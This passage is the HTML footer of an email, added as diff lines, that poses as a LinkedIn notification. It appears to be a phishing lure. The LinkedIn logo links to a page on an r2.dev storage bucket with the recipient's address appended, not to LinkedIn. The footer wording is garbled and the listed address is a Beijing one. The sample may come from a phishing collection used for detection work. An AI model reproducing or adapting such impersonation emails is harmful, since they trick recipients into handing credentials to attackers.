+tbody></table></td></tr><tr><td style=3D"margin: 0px;"><table width=3D"100%=
+" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"=
+center" style=3D"margin: 0px; padding: 0px 0px 12px;"><p style=3D"margin: 0=
+px; line-height: 1.3; font-size: 12px;"><span style=3D"border-width: 0px; m=
+argin: 0px; padding: 0px; outline-width: 0px; outline-style: none;"><font s=
+tyle=3D"vertical-align: inherit;">
+<font style=3D"vertical-align: inherit;">You are receiving LinkedIn notific=
+ation emails.</font></font></span></p></td></tr><tr><td align=3D"center" st=
+yle=3D"margin: 0px; padding: 0px 0px 12px;"><p style=3D"margin: 0px; line-h=
+eight: 1.3; font-size: 12px;"><span style=3D"border-width: 0px; margin: 0px=
+; padding: 0px; outline-width: 0px; outline-style: none;"><font style=3D"ve=
+rtical-align: inherit;"><font style=3D"vertical-align: inherit;">This email=
+ was intended for</font></font></span>
+<font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inh=
+erit;">&nbsp;&nbsp;<b><span>&nbsp;</span><font color=3D"#ff0000">jose@monke=
+y.org</font></b>&nbsp; &nbsp;&nbsp;</font><u><span style=3D"border-width: 0=
+px; margin: 0px; padding: 0px; outline-width: 0px; outline-style: none;"><f=
+ont style=3D"vertical-align: inherit;">to understand why we have included t=
+his.</font></span></u></font><u><span style=3D"border-width: 0px; margin: 0=
+px; padding: 0px; outline-width: 0px; outline-style: none;">
+<font style=3D"vertical-align: inherit;"></font></span></u></p></td></tr><t=
+r><td align=3D"center" style=3D"margin: 0px; padding: 0px 0px 8px;">
+<a style=3D"color: rgb(106, 108, 109); display: inline-block;" href=3D"http=
+s://pub-a8ed7885114f43bb97f4bf4057dd6dcf.r2.dev/bgt.html#jose@monkey.org" t=
+arget=3D"_blank" rel=3D"noreferrer" data-saferedirecturl=3D"https://www.goo=
+gle.com/url?q=3Dhttps://pub-a8ed7885114f43bb97f4bf4057dd6dcf.r2.dev/bgt.htm=
+l%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1699437752105000&amp;u=
+sg=3DAOvVaw2wJaAc04kRiyvvvyvyxZ5s">
+<img width=3D"58" height=3D"14" style=3D"margin: 0px; padding: 0px; border:=
+ 0px currentColor; border-image: none; color: rgb(255, 255, 255); display: =
+block; outline-width: 0px; outline-style: none; text-decoration-line: none;=
+" alt=3D"LinkedIn"=20
+src=3D"https://ci4.googleusercontent.com/proxy/OJXu95yVaTT0IAXqBynx5ATa1vYS=
+xfGXy4GLzrh7L2JGMLEXTymHAbauEKO_7nrQcSQnHLqoHPT-caNawYjTgmU83fN_VdOUSXkcNvS=
+4NN1uRmDvbSUGDv4ISTfFlQOZw7S5ysym3Euuei1PsPhSUmKrafxm7CFPIjUBKcprxCkLuoHK_m=
+xC1BlVrIUr8suCJrj0FVi3nGbT4-ab2fC0m1yS-3XEiDm0tC8UAL9M5bzB-A55YFO3ofMJt97kF=
+8xGYiaCzvFearMVhNalbfhQRCkevtHcDyRZn--JiP98zeRFBZLZ7IsjN2fCsVijY8psFDh-SrjT=
+hN_9c49EX06DNk0i6bcoDuVoEeavFcQBx1j9_M5tzWVAZ2GFMfk_3-LwfUwTeZGCW3pOq4U2RV6=
+EMMZPfaCoFJcOQ1SbSIFdipqHxkrUcMpxfCAon8VOz4DkQD86Ko4
+TTHn07DRKAa2ITCvMadBLEhN8GV8u0p7YO-H_l-uDedUzQSd8tkNA0YNX3iCTMwYqwzjl7ruvUw=
+LSeHnw=3Ds0-d-e1-ft#https://ecp.yusercontent.com/mail?url=3Dhttps%3A%2F%2Fs=
+tatic.licdn.com%2Fsc%2Fp%2Fcom.linkedin.email-assets-frontend%253Aemail-ass=
+ets-frontend-static-content%252B__latest__%2Ff%2F%252Femail-assets-frontend=
+%252Fimages%252Femail%252Fphoenix%252Flogos%252Flogo_phoenix_footer_darkgra=
+y_197x48_v1.png&amp;t=3D1615982539&amp;ymreqid=3D0a26156f-249f-665e-1c9f-2a=
+004d01b300&amp;sig=3D3ec2rUE8GGx14EUJISVeTg--~D" border=3D"0">
+</a></td></tr><tr><td align=3D"center" style=3D"margin: 0px; padding: 0px 0=
+px 12px;"><p style=3D"margin: 0px; line-height: 1.3; font-size: 12px;"><spa=
+n style=3D"border-width: 0px; margin: 0px; padding: 0px; outline-width: 0px=
+; outline-style: none;"><font style=3D"vertical-align: inherit;"><font styl=
+e=3D"vertical-align: inherit;">&copy; LinkedIn.&nbsp;</font><font style=3D"=
+vertical-align: inherit;">Mailing address:&nbsp;</font></font><font style=
+=3D"vertical-align: inherit;">
+<font style=3D"vertical-align: inherit;">Room 817, 18th Floor, Building 18,=
+ No. 1 Disheng North Road, Yizhuang Development Zone, Beijing, China.&nbsp;=
+</font></font><font style=3D"vertical-align: inherit;"><font style=3D"verti=
+cal-align: inherit;">LinkedIn and the LinkedIn logo are&nbsp;</font></font>=
+<font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inh=
+erit;">registered trademarks of LinkedIn.</font></font></span></p></td></tr=
+></tbody></table></td></tr></tbody></table><p>
+<br class=3D"Apple-interchange-newline">
+</p>
+
+
+</body></html>
